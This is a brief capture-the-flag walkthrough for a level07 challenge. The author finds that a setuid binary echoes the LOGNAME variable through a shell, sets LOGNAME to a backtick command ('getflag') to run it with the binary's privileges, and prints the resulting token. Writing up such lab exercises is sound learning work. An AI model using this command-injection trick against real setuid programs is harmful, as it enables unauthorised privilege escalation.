-> ls -la

one interesting file

-rwsr-sr-x 1 flag07 level07 ... level07

-> ./level07

level07

-> strings level07

So an interesting string is found followed by /bin/echo :

LOGNAME
/bin/echo %s

So looks very likely that the script will run /bin/echo %s
with the env var LOGNAME as %s

Let's go !

So i'll check the value of LOGNAME and try to change it

-> printenv | grep LOGNAME

LOGNAME=level07

-> export LOGNAME=\`getflag\`

-> printenv | grep LOGNAME

LOGNAME=`getflag`

-> ./level07

Check flag.Here is your token : fiumuikeil55xe9cu4dood66h

-> su level08 ..
